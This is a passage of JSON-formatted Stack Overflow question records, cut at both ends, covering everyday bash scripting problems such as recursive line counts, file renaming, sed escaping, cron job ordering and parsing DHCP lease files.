26: syntax error: unexpected end of file\n</code></pre>\n"},{"tags":["linux","bash","shell"],"answer_count":14,"favorite_count":62,"up_vote_count":114,"down_vote_count":0,"view_count":39627,"score":114,"question_id":1358540,"title":"How to count all the lines of code in a directory recursively?","body":"<p>We've got a PHP application and want to count all the lines of code under a specific directory and its subdirectories.  We don't need to ignore comments, as we're just trying to get a rough idea. </p>\n\n<pre><code>wc -l *.php\n</code></pre>\n\n<p>That command works great within a given directory, but ignores subdirectories.  I was thinking this might work, but it is returning 74, which is definitely not the case...</p>\n\n<pre><code>find . -name '*.php' | wc -l\n</code></pre>\n\n<p>What's the correct syntax to feed in all the files?  </p>\n"},{"tags":["bash","wget"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12336257,"title":"How to wget a file at a moving adress?","body":"<p>I am trying to download a pdf file from a website, I know the name of the file, e.g. <strong>foo.pdf</strong>, but It's location changes every few weeks:\ne.g.\n<strong>www.server.com/media/123456/foo.pdf</strong>\nchanges into\n<strong>www.server.com/media/245415/foo.pdf</strong>\nThe number is always a six-figure number, so I tried using a bash script to go through all 10 million of them, but that obviously takes a lot of time:</p>\n\n<pre><code>i=0\nuntil [ \"$RC\" == \"0\" ] || [ $i == 1000000 ]\ndo\n  b=$(printf %06d $i)\n  wget -q http://www.server.com/media/${b}/foo.pdf -O bar.pdf\n  export RC=$?\n  i=$(($i + 1))\ndone\n</code></pre>\n\n<p>For wrong addresses I just get 404 errors.<br>\nI tested it around the currently correct address and it works.</p>\n\n<p>Does anyone know a faster way to solve this problem?</p>\n"},{"tags":["bash","script","egrep","processing-efficiency"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12748543,"title":"Efficient search of several strings in a text file","body":"<p>I use <strong>egrep</strong> to look for exact matches of several strings in a very long file ( 1 million of lines):</p>\n\n<pre><code>egrep \"\\&lt;string1\\&gt;|&lt;\\string2\\&gt;\" my_file\n</code></pre>\n\n<p>But it takes too many time even to find just two strings. It seems that it look for every string along the total lines of the file even when it finds an occurrence. \nIndeed, I know that the file contains just one occurence of each string. \nThen I would like to know whow to force egrep to stop looking for a string once it finds an occurence of it and look for the next one of the list. Or if there is another way to do that efficiently.</p>\n\n<p>Thanks.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12755764,"title":"How can I start a shell script in the terminal, using a shell script command?","body":"<p>I'd like to write a shell script that starts running another shell script in a separate terminal window. Which command should I use to run the following shell script in the terminal?</p>\n\n<pre><code>#!/bin/sh\n#name of this script: install applications.sh\nsudo apt-get update  # To get the latest package lists\nsudo apt-get install docky -y\n#etc.\n</code></pre>\n"},{"tags":["bash","filter","netcat"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":12329929,"title":"Filtering Netcat results in a Bash script","body":"<p>I am trying to write a script that connects to a list of IPs on port 53 - and I want the result to return only open ports. Here is the script I am running below - I have tried grepping and cutting the output but im not sure I am doing this correctly - I cant seem to pipe the script results to a text file either.</p>\n\n<pre><code>#!/bin/bash\n\nfor ip in $(seq 200 254); do\n    nc -v 192.168.11.$ip 53 &amp;\ndone\n</code></pre>\n\n<p>I apologise for its simplicity I am new - and if the solution is elsewhere</p>\n"},{"tags":["linux","bash","ubuntu","cron"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12755008,"title":"cronjob wait issue","body":"<p>i am running python scripts on a ubuntu server though cronjob bellow is my bash file content</p>\n\n<pre><code>#!/bin/bash\ncd /home/ubuntu/\nPATH=$PATH:/usr/local/bin\nexport PATH\nnohup scrapy crawl first_job &amp;\nnohup scrapy crawl second_job &amp;\nnohup scrapy crawl third_job &amp;\nwait $(pgrep third_job)\nnohup scrapy crawl fourth_job &amp;\n</code></pre>\n\n<p>what i want is <strong>fourth_job</strong> start executing as soon as <strong>third_job</strong> complete </p>\n\n<p>but</p>\n\n<p>currently even if <strong>third_job</strong> complete , <strong>fouth_job</strong> wait for the completion of <strong>first_job</strong> and <strong>second_job</strong></p>\n\n<p>thanks in advance</p>\n"},{"tags":["perl","bash","grep"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":67,"score":2,"question_id":12754160,"title":"find duplicate and execute script on a match","body":"<p>I am trying to create a script to parse a log file and find duplicate matches of a specific part of each line and if a duplicate exists I need to execute a script on the first line that matches the duplication. My log details are:</p>\n\n<pre><code>#: 177          101 User 1 Channel: SIP/101\n#: 178          117 User 2 Channel: SIP/117\n#: 179          150 User 3 Channel: SIP/150\n#: 356          166 User 4 Channel: SIP/166\n#: 387          117 User 2 Channel: SIP/117\n</code></pre>\n\n<p>I'd like to find duplicates based on the SIP/ part of the log file but I will need to execute a script based on the # part of the log file. Based on this log I need to execute a script for the #: 178 line.</p>\n\n<p>So far I have used </p>\n\n<p><code>egrep -o \".{50}SIP.{4}\"</code> </p>\n\n<p>to find the duplicates based on the SIP/ section of the line. It's not clear to me how I can then get the entire line to get the #: 178 and generate the script to execute.</p>\n"},{"tags":["java","bash","shell","command-line","lua"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12748921,"title":"In-application Java command line","body":"<p>I've been trying to figure out how to make a sort of command line within Java that acts similar to <a href=\"http://www.minecraftforum.net/topic/892282-132-computercraft-143-now-with-printed-books/\" rel=\"nofollow\">ComputerCraft's</a> CraftOS interface using known libraries like jBASH and luaj, except it seems that anything I come across either isn't maintained anymore or doesn't function all too well.  Unfortunately, dan200 keeps his source under lock and key, so I can't even see how he did it...</p>\n\n<p>Does this mean I might end up having to create my own BASH-y shell and/or my own LUA-y scripting method, or is there something that's being maintained now that is at least somewhat usable?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12750069,"title":"Renaming xml file extension using bash script","body":"<p>I have a directory which has many folder and each folder contains a list of XML files. I am writing a bash script that traverses through the files and renames the extension of the file to \"manual\" if the size of the file is greater than 65Mb. This is my first writing a shell script and I was able to write the code for traversing the files but I am having difficulty in the renaming part. </p>\n\n<pre><code>for file in $dir\ndo\n   size=$(stat -c%s \"$file\")\n   if test \"$size\" -gt \"68157440\"; then\n      echo \"Before Renaming....\"\n      echo $file\n      echo \"After renaming\"\n      mv *.manual `basename $file`.xml\n      echo $file\n   else \n      echo $file &gt;&gt; outlog.log\n   fi\ndone\n</code></pre>\n\n<p>an example of $file is,</p>\n\n<pre><code>/apps/jAS/dev/products-app/BConverter/data/supplier-data/TF/output/Fiber Optics and Fiber Management Solutions/Fiber Optic Cable Assemblies.xml\n</code></pre>\n"},{"tags":["bash","unix","mkdir"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12753319,"title":"Creating a directory and parents directory in unix","body":"<p>I can't believe such a simple homework question is messing with me:</p>\n\n<blockquote>\n  <p>Enter the Linux command to create both a parent directory called\n  'systems' and it's child directory called 'part3' at the same time.\n  Assume that directory 'systems' will branch-off your home directory\n  and that you are in your home directory to start. Use a relative\n  pathname.</p>\n</blockquote>\n\n<pre><code>You entered: mkdir -p ~/part3/systems/\nPlease try again.\n\nHint:\nUse mkdir with the appropriate option\n</code></pre>\n\n<p>Tried:</p>\n\n<pre><code>mkdir -p ~/systems/part3/\nmkdir -p ~systems/part3\nmkdir -p ~/systems/part3\nmkdir -p ~/systems/part3\nmkdir ~/systems/part3/\nmkdir ~systems/part3\nmkdir ~/systems/part3\nmkdir ~/systems/part3\n</code></pre>\n"},{"tags":["bash","grep","ls"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12754114,"title":"Bash: Limit output of ls and grep","body":"<p>Let me present an example and than try to explain my problem:</p>\n\n<pre><code>noob@noob:~/Downloads$ ls | grep srt$\nElementary - 01x01 - Pilot.LOL.English.HI.C.orig.Addic7ed.com.srt\nHaven - 01x01 - Welcome to Haven.DVDRip.SAiNTS.English.updated.Addic7ed.com.srt\nHaven - 01x01 - Welcome to Haven.FQM.English.HI.C.updated.Addic7ed.com.srt\nSupernatural - 08x01 - We Need to Talk About Kevin.LOL.English.HI.C.updated.Addic7ed.com.srt\nThe Big Bang Theory - 06x02 - The Decoupling Fluctuation.LOL.English.HI.C.orig.Addic7ed.com.srt\nTorchwood - 1x01 - Everything changes.0TV.English.orig.Addic7ed.com.srt\nTorchwood - 1x01 - Everything changes.divx.English.updated.Addic7ed.com.srt\n</code></pre>\n\n<p>Now I only want to delete the first <code>four results</code> of the above command. Normally if I have to delete all the files I would do <code>ls | grep srt$ | xargs -I {} rm {}</code> but in this case I only want to delete the top four.</p>\n\n<p>So, how can limit the output of ls and grep or suggest me an alternate way to achieve this.</p>\n"},{"tags":["bash","festival"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":12753504,"title":"Generate audio files using Festival","body":"<p>Is it possible to generate audio files in Festival by piping the output to some other program? I'm trying to find out how to convert an xml file to a audio file, using Festival's \"singing synthesis\" option.</p>\n"},{"tags":["bash","pipe","pid","tail","netcat"],"answer_count":11,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":4262,"score":7,"question_id":1652680,"title":"How to get the PID of a process that is piped to another process in Bash?","body":"<p>I am trying to implement a simple log server in Bash. It should take a file as a parameter and serve it on a port with netcat.</p>\n\n<pre><code>( tail -f $1 &amp; ) | nc -l -p 9977\n</code></pre>\n\n<p>But the problem is that when the netcat terminates, tail is left behind running. (Clarification: If I don't fork the tail process it will continue to run forever even the netcat terminates.) </p>\n\n<p>If I somehow know the PID of the tail then I could kill it afterwards.<br />\nObviously, using $! will return the PID of netcat.</p>\n\n<p>How can I get the PID of the tail process?</p>\n"},{"tags":["java","bash","file","directory","classpath"],"answer_count":4,"favorite_count":6,"up_vote_count":15,"down_vote_count":0,"view_count":4802,"score":15,"question_id":4729863,"title":"Using bash, how do you make a classpath out of all files in a directory","body":"<p>This will be a <strong><em>really</em></strong> simple freebie for a bash guru:</p>\n\n<p><strong>Question</strong></p>\n\n<p>Using bash, how do you make a classpath out of all files in a directory?\n<hr>\n<strong>Details</strong></p>\n\n<p>Given a directory:</p>\n\n<pre><code>LIB=/path/to/project/dir/lib\n</code></pre>\n\n<p>that contains nothing but *.jar files such as:</p>\n\n<pre><code>junit-4.8.1.jar\njurt-3.2.1.jar\nlog4j-1.2.16.jar\nmockito-all-1.8.5.jar\n</code></pre>\n\n<p>I need to create a colon-separated classpath variable in the form:</p>\n\n<pre><code>CLASSPATH=/path/to/project/dir/lib/junit-4.8.1.jar:/path/to/project/dir/lib/jurt-3.2.1.jar:/path/to/project/dir/lib/log4j-1.2.16.jar:/path/to/project/dir/lib/mockito-all-1.8.5.jar\n</code></pre>\n\n<p>Some seudo-code that nearly expresses the logic I'm looking for would be along the lines of:</p>\n\n<pre><code>for( each file in directory ) {\n   classpath = classpath + \":\" + LIB + file.name\n}\n</code></pre>\n\n<p>What is a <strong><em>simple</em></strong> way to accomplish this via bash script?</p>\n"},{"tags":["regex","linux","bash","shell","script"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":12734027,"title":"How to verify if the string also starts and ends with a space in shell script?","body":"<p>How to verify if the string also starts and ends with one or more space(s) ?</p>\n\n<pre><code>if [[ $username =~ [^0-9A-Za-z]+ ]]\n</code></pre>\n\n<p>(basically input should be alphanumeric, no spaces anywhere, even in the beginning or in the end, and no commas, underscores, hiphens etc)</p>\n\n<p>The above regex unfortunately does NOT match leading &amp; trailing spaces, but it matches spaces in between ?</p>\n\n<p>Without awk, sed, is there any way I can fix the above regex to match leading &amp; trailing spaces also ?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["bash","parsing","grep"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":2686,"score":1,"question_id":2142824,"title":"Parse a dhcpd.lease File with Bash","body":"<p>I Try to parse my dhcpd.lease File with Basel. A typical entry looks like this:</p>\n\n<pre><code>lease 192.168.20.4 {\n    starts 6 2009/06/27 00:40:00;\n    ends 6 2009/06/27 12:40:00;\n    hardware ethernet 00:00:00:00:00:00;\n    uid 00:00:00:00:00:00;\n    client-hostname \"examle-workstation1\";\n}\n</code></pre>\n\n<p>All information i get is the MAC and what i want ist the IP and the client-hostname. But maybe, there is no client-hostname. The entry looks like this:</p>\n\n<pre><code>lease 192.168.20.5 {\n    starts 6 2009/06/27 00:40:00;\n    ends 6 2009/06/27 12:40:00;\n    hardware ethernet 00:00:00:00:00:00;\n}\n</code></pre>\n\n<p>My first idea was to grep the lease attribute, the hardware ethernet attribute and the uid attribute and putt it all on one line. And then parse it.</p>\n\n<p>But my problem is, i have a big file with many entries allocated in many files. The tree looks like this:</p>\n\n<pre><code>dhcpd-leases\n-- 192.168.20.0\n-- 192.168.30.0\n-- 192.168.40.0\n[...]\n</code></pre>\n\n<p>And all what i get ist the MACs parsed from another files in to a list. So i start with this list and want to grep the Attributes ip, mac with my MAC:</p>\n\n<pre><code>for ENTRY in $MACLIST\ndo\n    VAR$(cat \"dhcpd-leases/10.148.$NETWORK.2/dhcpd.leases\" | grep -E \"$MAC|lease|client-hostname\")\n    echo $VAR\ndone\n</code></pre>\n\n<p>But it because of the many entrys in the $VAR and the files im unable to Parse it out right.</p>\n\n<p>Can somenone help?</p>\n\n<p>Best regards\nPeter</p>\n"},{"tags":["bash","shell"],"answer_count":7,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":4333,"score":5,"question_id":3061036,"title":"how to find variable is empty or \"\" in shell script","body":"<p>How can I check if a variable is empty in Shell?</p>\n"},{"tags":["bash","sed","awk","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12709671,"title":"Substituting values of one column from a list of corresponding values","body":"<p>I want to replace the entries in one column of file input <em>A.txt</em> by the list given in <em>B.txt</em> in corresponding order</p>\n\n<p>For example</p>\n\n<p><em>A.txt</em> is <strong>tab delimited</strong> but in a column values are separated by comma\nneed to change one of entries of that column values say <code>P=</code></p>\n\n<pre><code>1 X y Z Q=Alpha,P=beta,O=Theta\n2 x a b Q=Alpha,P=beta,O=Theta\n3 y b c Q=Alpha,P=beta,O=Theta\n4 a b c Q=Alpha,P=beta,O=Theta\n5 x y z Q=Alpha,P=beta,O=Theta\n</code></pre>\n\n<p><em>B.txt</em> is</p>\n\n<pre><code>1 gamma\n2 alpha\n3 alpha\n4 gamma\n5 alpha\n</code></pre>\n\n<p>now reading each entry in <em>A.txt</em> and replace <code>P=</code> with the corresponding line values in <em>B.txt</em></p>\n\n<p>Output:</p>\n\n<pre><code>1 X y Z Q=Alpha,P=gamma,O=Theta\n2 x a b Q=Alpha,P=alpha,O=Theta\n3 y b c Q=Alpha,P=alpha,O=Theta\n4 a b c Q=Alpha,P=gamma,O=Theta\n5 x y z Q=Alpha,P=alpha,O=Theta\n</code></pre>\n\n<p>Thanks in advance!!!</p>\n"},{"tags":["bash","command-line","cygwin","history"],"answer_count":6,"favorite_count":7,"up_vote_count":14,"down_vote_count":0,"view_count":4051,"score":14,"question_id":338285,"title":"Prevent duplicates from being saved in bash history","body":"<p>I'm trying to prevent bash from saving duplicate commands to my history. Here's what I've got:</p>\n\n<pre><code>shopt -s histappend\nexport HISTIGNORE='&amp;:ls:cd ~:cd ..:[bf]g:exit:h:history'\nexport HISTCONTROL=erasedups\nexport PROMPT_COMMAND='history -a'\n</code></pre>\n\n<p>This works fine while I'm logged in and .bash_history is in memory. For example:</p>\n\n<pre><code>$ history\n    1 vi .bashrc\n    2 vi .alias\n    3 cd /cygdrive\n    4 cd ~jplemme\n    5 vi .bashrc\n    6 vi .alias\n\n$ vi .bashrc\n\n$ history\n    1 vi .alias\n    2 cd /cygdrive\n    3 cd ~jplemme\n    4 vi .alias\n    5 vi .bashrc\n\n$ vi .alias\n\n$ history\n    1 cd /cygdrive\n    2 cd ~jplemme\n    3 vi .bashrc\n    4 vi .alias\n\n$ exit\n</code></pre>\n\n<p>But when I log back in, my history file looks like this:</p>\n\n<pre><code>$ history\n    1 vi .bashrc\n    2 vi .alias\n    3 cd /cygdrive\n    4 cd ~jplemme\n    5 vi .bashrc\n    6 vi .alias\n    7 vi .bashrc\n    8 vi .alias\n</code></pre>\n\n<p>What am I doing wrong?</p>\n\n<p>EDIT: Removing the shopt and PROMPT_COMMAND lines from .bashrc does not fix the problem.</p>\n"},{"tags":["osx","bash","macports","finder","spotlight"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12745796,"title":"How do I launch shell applications after changing shell to MacPorts bash?","body":"<p>I have installed a current bash version via MacPorts and changed Terminal.app to use /opt/local/bin/bash. Unfortunately shell applications won't launch from Finder and Spotlight anymore. (OSX 10.8.2, Bash 4.2.37)</p>\n"},{"tags":["bash","shell","equations"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12704736,"title":"Try solver System of linear algebraic equations in Shell Bash","body":"<p>I want to try solving system of linear algebraic equations using the bash shell but have had problems. The input value is a matrix, however I dont know how to input matrix in bash because that is doesn't support 2-dimensional arrays.</p>\n\n<p>Thank you so much.</p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12748591,"title":"Recursively list all the files with path relative to the directory being scanned","body":"<p>Let's say we have something like:</p>\n\n<pre><code>/tmp/tmp.KVKc82GspR\n/tmp/tmp.KVKc82GspR/CONTENTS\n/tmp/tmp.KVKc82GspR/opt\n/tmp/tmp.KVKc82GspR/opt/source\n/tmp/tmp.KVKc82GspR/opt/source/sm\n/tmp/tmp.KVKc82GspR/opt/source/sm/LVHDoISCSISR.py\n/tmp/tmp.KVKc82GspR/opt/source/sm/LVHDoHBASR.py\n/tmp/tmp.KVKc82GspR/verify_update\n</code></pre>\n\n<p>I want to get:</p>\n\n<pre><code>CONTENTS\nopt/source/sm/LVHDoISCSISR.py\nopt/source/sm/LVHDoHBASR.py\nverify_update\n</code></pre>\n\n<p>I do have some options but I don like them:</p>\n\n<ul>\n<li><code>cd /tmp/tmp.KVKc82GspR; find . -name '*'</code> would add <code>./</code> before and worse would change \ncurrent directory.</li>\n<li><code>ls</code> doesn't work well recursively</li>\n</ul>\n\n<p>Note: I would prefer a single line solution, if possible :D </p>\n"},{"tags":["bash"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12745533,"title":"Bash needs resetting every time","body":"<p>For some time my <strong>bash is not showing what I write</strong> (\"echoing\"?) and I have to run <code>reset</code> command every time I open new session.</p>\n\n<p>I \"fixed\" it just by adding <code>reset</code> at the end of ~/.bashrc, but it is not the best solution since it's computer-specific garbage in my universal settings and this command takes time.</p>\n\n<p><strong>What should I do to fix those settings permanently?</strong></p>\n"},{"tags":["bash","grep","find","xargs"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12646124,"title":"find with spaces in filename","body":"<p>I often use grep twice with find in order to search for two patterns in a file as follows:</p>\n\n<pre><code>find . -name \\*.xml | xargs grep -l \"&lt;beans\" | xargs grep singleton\n</code></pre>\n\n<p>Then I ran into files with spaces which of course broke the above command.  I modified it as follows to deal with the spaces:</p>\n\n<pre><code>find . -name \\*.xml -print0 | xargs -0 grep -l \"&lt;beans\" | xargs grep singleton\n</code></pre>\n\n<p>The option -print0 tells find to use print null as a separator instead of space and -0 tells xargs to expect a null.  This works as long as none of the files I am looking for have spaces in their paths, but it breaks if they do.</p>\n\n<p>So what I need is a flag to tell grep to print null as a speartor instead of newline.</p>\n\n<p>Any ideas?</p>\n"},{"tags":["bash","rename","mass"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":100,"score":-1,"question_id":12329688,"title":"Mass rename files (bash)","body":"<p>I have several folders with photos and each an average of 15 thousand photos and now I want one go for a script to rename files.\nMay the name of the file\nobraz2.jpg.1 to obraz2.jpg.1500 and now chcaiłbym to each file name was changed to the date when it was created, eg: 010912-04-00-34.jpg file from 1 September 2012 hour 4 minutes 0 seconds and 34, have a bash script</p>\n\n<pre><code>#!/bin/bash\n# Copy jpg files in a directory to a new name based solely on creation date\n# FROM: obraz2.jpg.1 &gt; 1500  Created on: 2012-04-18 18:51:44\n# TO:    20120418_185144.jpg\nfor i in *.*\ndo\n#  mod_date=$(stat -c \"%y\" \"$i\"|sed 's/\\..*$//')\n#  mod_date=$(stat -c \"%y\" \"$i\"|awk '{print $1\"_\"$2}'|sed 's/\\..*$//')\nmod_date=$(stat --format %y \"$i\"|awk '{print $1\"_\"$2}'|cut -f1 -d'.'|sed 's/[: -]//g')\n cp \"$i\" \"$mod_date\".jpg\ndone\n</code></pre>\n\n<p>I just have a problem that was the name he gave\n010912-04-00-34.jpg and this is not a script that does 20120418_185144.jpg what should be changed to make it just like I want, I'll add the script, I found myself not written.</p>\n"},{"tags":["regex","bash","tr"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12744706,"title":"How to extract two numbers from a word and store then in two separate variables in bash?","body":"<p>I believe my question is very simple for someone who knows how to use regular expressions, but I am very new at it and I can't figure out a way to do it. I found many questions similar to this, but none could solve my problem.</p>\n\n<p>In bash, i have a few variables that are of the form \n    nw=[:digit:]+.a=[:digit:]+\nfor example, some of these are nw=323.a=42 and nw=90.a=5\nI want to retrieve these two numbers and put them in the variables $n and $a.\nI tried several tools, including perl, sed, tr and awk, but couldn't get any of these to work, despite I've been googling and trying to fix it for an hour now. tr seems to be the fittest though.</p>\n\n<p>I'd like a piece of code which would achieve the following:</p>\n\n<pre><code>#!/bin/bash\nldir=\"nw=64.a=2 nw=132.a=3 nw=4949.a=30\"\nfor dir in $ldir; do\n    retrieve the number following nw and place it in $n\n    retrieve the number following a and place it in $a\ndone\n... more things...\n</code></pre>\n"},{"tags":["bash","sed"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12745536,"title":"Fixing quote escaping with bash script and sed","body":"<p>I have a bash file processing some CSVs.  Some of the input CSVs are not formatted properly, so I want to fix them with sed.  The quotes are escaped like <code>\\\"</code> and not like <code>\"\"</code>, so I call sed to change this.  In the command line this works perfectly:</p>\n\n<pre><code>sed -i 's/\\\\\"/\"\"/gi' input.csv\n</code></pre>\n\n<p>But inside a bash script this seems to do nothing.  I guess it has something to do with quotes and escape sequences, but what is the solution?</p>\n"},{"tags":["linux","bash","xargs"],"answer_count":7,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":633,"score":3,"question_id":8519219,"title":"xargs and find, rm complaining about \\n (newline) in filename ","body":"<p>I am trying to delete the oldest file in a tree with a script in Debian.</p>\n\n<pre><code>find /home/backups -type f \\( -name \\*.tgz -o -name \\*.gz \\) -print0 | xargs -0 ls -t | tail -1 | xargs -0 rm\n</code></pre>\n\n<p>But I am getting an error:</p>\n\n<pre><code>rm: cannot remove `/home/backups/tree/structure/file.2011-12-08_03-01-01.sql.gz\\n': No such file or directory\n</code></pre>\n\n<p>Any ideas what I am doing wrong (or is there an easier/better way?), I have tried to RTFM, but am lost.</p>\n"},{"tags":["linux","bash"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1032,"score":2,"question_id":3649760,"title":"How to get unique `uid`?","body":"<p>I'm making a bash script which should create an ftp user.</p>\n\n<pre><code>ftpasswd --passwd --file=/usr/local/etc/ftpd/passwd --name=$USER --uid=[xxx]\n     --home=/media/part1/ftp/users/$USER --shell=/bin/false\n</code></pre>\n\n<p>The only supplied argument to script is user name. But <code>ftpasswd</code> also requires <code>uid</code>. How do I get this number? Is there an easy way to scan <code>passwd</code> file and get the max number, increment it and use it? Maybe it's possible to obtain that number from the system?</p>\n"},{"tags":["linux","bash","unix","cp"],"answer_count":7,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1102,"score":2,"question_id":9464752,"title":"cp dir recursivly excluding 2 subdirs","body":"<p>I have 1 directory with 9 subdirectories and 10 files.\nSubdirectory have next level subdirectories and files.</p>\n\n<pre><code>/home/directory/\n/home/directory/subdirectory1\n/home/directory/subdirectory2\n...\n/home/directory/subdirectory9\n/home/directory/file1\n...\n/home/directory/file10\n</code></pre>\n\n<p>I want to copy all subdirectories and files recursivly excluding:</p>\n\n<pre><code>/home/directory/subdirectory5\n/home/directory/subdirectory7\n</code></pre>\n\n<p>What is the best way for it?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12744353,"title":"Bash - Parsing and variables","body":"<pre><code>case 4.1\nInfo for unit 1 starts now\ninfo1\ninfo2\ninfo3\ninfo5  - the one I want\ninfo6\ninfo7\nInfo for unit 2 starts now\ninfo1\ninfo2\ninfo3\ninfo5  - the one I want\ninfo6\ninfo7\nendcase 4.1\n</code></pre>\n\n<p>The info for the 2 units are printed out over 1000 times in the file.</p>\n\n<p>My algorithm is as follows:</p>\n\n<pre><code>while read line\ndo\n    if line contains unit1\n    then current_unit=1\n    if line contains unit2\n    then current_unit2\n\n    if line contains info5\n    then \n         if current_unit = 1\n            then unit1_val = *the relevant info from this line*\n         elif current_unit = 2 \n             then unit2_val = *the relevant info from this line*\n\n    if both unit1_val &gt; 20 &amp;&amp; unit2_val &gt; 20\n    then pass\n</code></pre>\n\n<p>Short version: pull the values i need, if at some point both values are over a certain value, test passed. I'm also trying to do this using Bash</p>\n\n<p>Edit for clarity:\nThe problem that I', having is passing variables in and out of if statements. My parsing and comparisons are fine, however When i get to the last if, the values are not there, because they are local to the if - fi they come from (or dont come from, as the case may be)</p>\n\n<p>edit 2:</p>\n\n<pre><code>    if [[ $line == *\"info5\"* ]]\n    then\n            CURRENT_UNIT=5\n    fi\n\n    if [[ $line = *\"info6\"* ]]\n    then\n            CURRENT_UNIT=6\n\n\n    fi\n\n\n    if [[ $line =~ \"text i want\" ]]\n    then\n            if [[ $CURRENT_UNIT -eq 5 ]]\n            then\n                    UNIT_5_MEM=$(awk '/Used heap/ { gsub(/M/, \" \"); print $4 }')\n            elif [[ $CURRENT_VC -eq 6 ]]\n            then    UNIT_6_MEM=$(awk '/Used heap/ { gsub(/M/, \" \"); print $4 }')\n            fi\n    fi\n\n    if [[ $UNIT_5_MEM -gt 20 &amp;&amp; $UNIT_6_MEM -gt 20 ]]\n    then\n            echo \"Passed\"\n    fi\n</code></pre>\n"},{"tags":["bash","terminal","gnome","kde"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12745122,"title":"Why elinks not working properly on kde terminal","body":"<p>I have a script which fetches a word's meaning (translates english/turkish and turkish/english) from a remote web page and parsing it with using elinks and simple grep. It's quite simple script, but the strange thing is that it doesn't seem to work on my yakuake, but it's running gently on default gnome terminal or guake. </p>\n\n<p>the script:</p>\n\n<pre><code>#!/bin/bash\n\nurl_encode() {\n    # http://www.commandlinefu.com/commands/view/4840/url-encode\n    # http://stackoverflow.com/questions/296536/urlencode-from-a-bash-script\n    echo -n \"${@: -1}\" | python2 -c \"import urllib, sys; print urllib.quote(sys.stdin.readline())\"\n    # echo \"$@\" | perl -MURI::Escape -ne 'chomp;print uri_escape($_),\"\\n\"'\n}\n\nif [ $1 = \"-v\" ]; then\n  elinks -dump -no-numbering \"http://tureng.com/search/$(url_encode $@)\" | grep -E '(^\\s*Category\\s*|&gt;$)' --color=never | less\nelse \n  elinks -dump -no-numbering \"http://tureng.com/search/$(url_encode $@)\" | grep -E '(^\\s*Category\\s*|&gt;$)' --color=never | head -n 6\nfi\n</code></pre>\n\n<p>when I run this on gnome terminal, this is the output;</p>\n\n<pre><code>14:03 ~ $ tureng test\n     Category    Turkish  English\n   1 General  n. test    trial      &gt;\n   2 General  n. test    testing    &gt;\n   3 General  n. test    test       &gt;\n   4 General  n. test    experiment &gt;\n   5 General     test    quiz       &gt;\n</code></pre>\n\n<p>and this is the yakuake output;</p>\n\n<pre><code>14:04 ~ $ tureng test\n   &lt;!-- Web.Config Configuration File --&gt;\n   &lt;configuration&gt;\n       &lt;system.web&gt;\n           &lt;customErrors mode=\"Off\"/&gt;\n       &lt;/system.web&gt;\n   &lt;/configuration&gt;\n</code></pre>\n\n<p>I'm completely lost on this. Any idea on, why this happens would be appreciated. </p>\n"},{"tags":["arrays","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12744031,"title":"How to change values of bash array elements without loop","body":"<pre><code>array=(a b c d)\n</code></pre>\n\n<p>I would like to add a character before each element of the array in order to have this</p>\n\n<pre><code>array=(^a ^b ^c ^d)\n</code></pre>\n\n<p>An easy way to do that is to loop on array elements and change values one by one</p>\n\n<pre><code>for i in \"${#array[@]}\"\ndo\n    array[i]=\"^\"array[i]\ndone\n</code></pre>\n\n<p>But I would like to know if there is any way to do the same thing without looping on the array as I have to do the same instruction on all elements.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12738189,"title":"Make a text file in a certain directory from another directory in Unix","body":"<p>Was wondering how the code would look like if you 